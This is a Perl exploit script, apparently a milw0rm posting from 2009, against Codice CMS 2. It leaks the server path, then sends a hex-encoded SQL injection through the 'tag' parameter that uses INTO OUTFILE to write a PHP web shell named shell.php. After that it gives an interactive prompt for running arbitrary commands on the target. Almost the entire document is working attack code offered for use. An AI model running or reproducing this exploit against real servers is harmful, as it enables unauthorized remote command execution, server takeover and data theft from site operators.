#--+++===========================================================+++--
#--+++====== Codice CMS 2 Remote Command Execution Exploit ======+++--
#--+++===========================================================+++--


#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

sub banner
{
	print 	"--+++===========================================================+++--\n".
		"--+++====== Codice CMS 2 Remote Command Execution Exploit ======+++--\n".
		"--+++===========================================================+++--\n\n";
}

sub usage
{
	die "\n[+] Author   : darkjoker".
	     "\n[+] Site    : http://darkjoker.net23.net".
	     "\n[+] Download: http://freefr.dl.sourceforge.net/sourceforge/codice/codice-dev-prev.zip".
	     "\n[+] Usage   : perl $0 <hostname> <path>".
	     "\n[+] Ex.     : perl $0 localhost /codiceCMS".
	     "\n[+] 22-03-2009 Gigi D'Agostino allo Chalet, parco del Valentino, Torino!!".
	     "\n\n";
}

sub dec2hex
{
	my $num = $_ [0];
	my $hex = sprintf ("%x", $num);
	return $hex;
}

sub hex_format
{
	my $i = 0;
	my $hex;
	my @string = split '', $_ [0];
	while ($i < scalar (@string))
	{
		$hex .= "%" . dec2hex (ord ($string [$i]));
		$i++;
	}
	return $hex;
}

sub get_script_path
{
	my ($hostname, $path) = @_;
	my $sock = new IO::Socket::INET (
		PeerHost => $hostname, 
		PeerPort => 80,
		Proto    => "tcp",
	) or usage;
	my $get =  "GET ${path}/index.php?id HTTP/1.1\r\n".
		   "Host: ${hostname}\r\n".
		   "Connection: Close\r\n\r\n";
	print $sock $get;
	my $src_path;
	while (<$sock>)
	{
		$src_path = $1 if ($_ =~ /resource in <b>(.+?)<\/b>/);
	}
	close ($sock);
	return ($src_path) ? $src_path : 0;
}

sub create_shell
{
	my ($hostname, $path, $query) = @_;
	my $sock = new IO::Socket::INET (
		PeerHost => $hostname, 
		PeerPort => 80,
		Proto    => "tcp",
	) or usage;
	my $get = "GET ${path}/index.php?tag=${query} HTTP/1.1\r\n".
		  "Host: ${hostname}\r\n".
		  "Connection: Close\r\n\r\n";
	print $sock $get;
	close ($sock);
}

banner ();
my ($hostname, $path) = @ARGV;
usage unless ($path);
my $shell_path = get_script_path ($hostname, $path);
$shell_path =~ s/index\.php$/shell\.php/;
my $query = 'x %\' UNION SELECT 1, \'<?php system (stripslashes($_GET[\\\'cmd\\\'])); ?>\', 3, 4, 5, 6, 7 INTO OUTFILE \''.$shell_path.'\' FROM cod_codice--';
$query = hex_format ($query);
create_shell ($hostname, $path, $query);
print "Remember to delete 'shell.php' before exit!\n";
while (1)
{
	print "nobody\@${hostname} > ";
	my $cmd = <STDIN>;
	chomp $cmd;
	die ("Good bye!\n") if $cmd =~ /^quit$/;
	$cmd = hex_format ($cmd);
	my $sock = new IO::Socket::INET (
		PeerHost => $hostname,
		PeerPort => 80,
		Proto    => "tcp",
	);
	my $req =  "GET ${path}/shell.php?cmd=${cmd} HTTP/1.1\r\n".
		   "Host: ${hostname}\r\n".
		   "Connection: Close\r\n\r\n";
	print $sock $req;
	my $k;
	while (<$sock>)
	{
		chomp $_;
		$_ .= "newline";
		$k .= $_;
	}
	$k =~ s/^.+1\t//;
	$k =~ s/\t3.+$//;
	$k = join ("\n", split ("newline", $k));
	print $k . "\n";
	close ($sock);
}

# milw0rm.com [2009-03-23]
